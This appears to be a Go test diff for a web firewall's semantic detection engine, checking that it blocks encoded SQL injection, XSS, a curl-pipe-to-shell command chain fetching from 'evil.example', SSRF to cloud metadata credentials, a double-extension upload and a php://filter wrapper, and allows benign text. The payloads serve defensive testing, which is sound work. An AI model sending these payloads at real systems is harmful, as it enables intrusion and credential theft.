@@ -2,6 +2,7 @@ package detection
 
 import (
 	"context"
+	"net/http"
 	"strings"
 	"testing"
 )
@@ -166,6 +167,139 @@ func TestT144EntropyOnlyNeverBlocks(t *testing.T) {
 	for _, match := range result.Matches {
 		if match.ID == SemanticEntropyRuleID && match.Action == RuleActionDeny {
 			t.Fatalf("entropy match must not deny: %+v", match)
+		}
+	}
+}
+
+func TestT151SemanticEngineMatchesExpandedCategories(t *testing.T) {
+	engine := NewSemanticEngine(nil, SemanticOptions{})
+
+	tests := []struct {
+		name             string
+		req              Request
+		ruleID           int
+		group            string
+		source           string
+		normalizedSubstr string
+		requiredEvidence []string
+		minScore         int
+		wantAction       RuleAction
+	}{
+		{
+			name:             "encoded sqli union variant",
+			req:              Request{URI: "/search", Args: map[string][]string{"q": {"un/**/ion%20sel/**/ect password from users --"}}},
+			ruleID:           SemanticSQLChopRuleID,
+			group:            "sqli",
+			source:           "semantic/sqlchop",
+			normalizedSubstr: "union select password from users",
+			requiredEvidence: []string{"structure:comment_bypass", "normalization:encoded_payload", "structure:union_query"},
+			minScore:         8,
+			wantAction:       RuleActionDeny,
+		},
+		{
+			name:             "encoded xss script variant",
+			req:              Request{URI: "/search?q=%253Csvg%2520onload%253Dalert%25281%2529%253E"},
+			ruleID:           SemanticXSSChopRuleID,
+			group:            "xss",
+			source:           "semantic/xsschop",
+			normalizedSubstr: "<svg onload=alert(1)>",
+			requiredEvidence: []string{"normalization:encoded_payload", "token:event_handler", "structure:svg_context"},
+			minScore:         7,
+			wantAction:       RuleActionDeny,
+		},
+		{
+			name:             "rce command chain",
+			req:              Request{Body: "cmd=sh -c 'curl http://evil.example/p.sh|sh && whoami'"},
+			ruleID:           SemanticRCEChopRuleID,
+			group:            "rce",
+			source:           "semantic/rcechop",
+			normalizedSubstr: "curl http://evil.example/p.sh|sh && whoami",
+			requiredEvidence: []string{"token:download_execute", "structure:command_chain", "token:recon_command"},
+			minScore:         8,
+			wantAction:       RuleActionDeny,
+		},
+		{
+			name:             "ssrf metadata target",
+			req:              Request{Method: http.MethodGet, URI: "/fetch", Args: map[string][]string{"url": {"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}},
+			ruleID:           SemanticSSRFChopRuleID,
+			group:            "ssrf",
+			source:           "semantic/ssrfchop",
+			normalizedSubstr: "169.254.169.254/latest/meta-data",
+			requiredEvidence: []string{"token:request_sink", "token:metadata_endpoint", "structure:internal_host"},
+			minScore:         7,
+			wantAction:       RuleActionDeny,
+		},
+		{
+			name:             "upload double extension multipart",
+			req:              Request{Headers: http.Header{"Content-Type": {"multipart/form-data; boundary=test"}}, Body: "------test\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"avatar.jpg.php\"\r\nContent-Type: application/octet-stream\r\n\r\nbenign marker for upload test\r\n------test--"},
+			ruleID:           SemanticUploadRuleID,
+			group:            "upload",
+			source:           "semantic/uploadchop",
+			normalizedSubstr: "filename=\"avatar.jpg.php\"",
+			requiredEvidence: []string{"structure:upload_carrier", "structure:double_extension", "structure:multipart_filename"},
+			minScore:         8,
+			wantAction:       RuleActionDeny,
+		},
+		{
+			name:             "protocol wrapper carrier",
+			req:              Request{URI: "/proxy", Args: map[string][]string{"resource": {"php://filter/convert.base64-encode/resource=index.php"}}},
+			ruleID:           SemanticProtoRuleID,
+			group:            "protocol",
+			source:           "semantic/protochop",
+			normalizedSubstr: "php://filter/convert.base64-encode/resource=index.php",
+			requiredEvidence: []string{"token:dangerous_scheme", "structure:protocol_wrapper"},
+			minScore:         6,
+			wantAction:       RuleActionDeny,
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			result, err := engine.Inspect(context.Background(), tc.req)
+			if err != nil {
+				t.Fatalf("Inspect returned error: %v", err)
+			}
+			if result.Decision != DecisionBlock {
+				t.Fatalf("decision=%q, want block; matches=%+v", result.Decision, result.Matches)
+			}
+			match := matchByID(result, tc.ruleID)
+			if match.ID == 0 {
+				t.Fatalf("missing semantic rule %d in %+v", tc.ruleID, result.Matches)
+			}
+			if match.Group != tc.group || match.Source != tc.source {
+				t.Fatalf("unexpected metadata: %+v", match)
+			}
+			if match.Score < tc.minScore || match.Action != tc.wantAction {
+				t.Fatalf("unexpected score/action: %+v", match)
+			}
+			if !strings.Contains(match.Message, tc.normalizedSubstr) {
+				t.Fatalf("message missing normalized value %q: %s", tc.normalizedSubstr, match.Message)
+			}
+			for _, item := range tc.requiredEvidence {
+				if !containsEvidence(match.Evidence, item) {
+					t.Fatalf("evidence missing %q: %+v", item, match.Evidence)
+				}
+			}
+		})
+	}
+}
+
+func TestT151SemanticEngineAllowsOrdinaryTechnicalText(t *testing.T) {
+	engine := NewSemanticEngine(nil, SemanticOptions{})
+
+	tests := []Request{
+		{Method: http.MethodGet, URI: "/docs", Args: map[string][]string{"q": {"documentation about curl, bash, and command pipelines for CI runners"}}},
+		{Method: http.MethodGet, URI: "/wiki", Args: map[string][]string{"url": {"https://example.com/docs/api/callback-url-setup"}}},
+		{Method: http.MethodPost, URI: "/notes", Body: "Example multipart/form-data filename handling for avatar.jpg uploads in nginx docs"},
+		{Method: http.MethodGet, URI: "/search", Args: map[string][]string{"resource": {"Protocol wrappers like php://filter are discussed in a security article"}}},
+	}
+	for _, req := range tests {
+		result, err := engine.Inspect(context.Background(), req)
+		if err != nil {
+			t.Fatalf("Inspect returned error: %v", err)
+		}
+		if result.Decision != DecisionAllow {
+			t.Fatalf("ordinary technical text blocked: req=%+v result=%+v", req, result)
 		}
 	}
 }
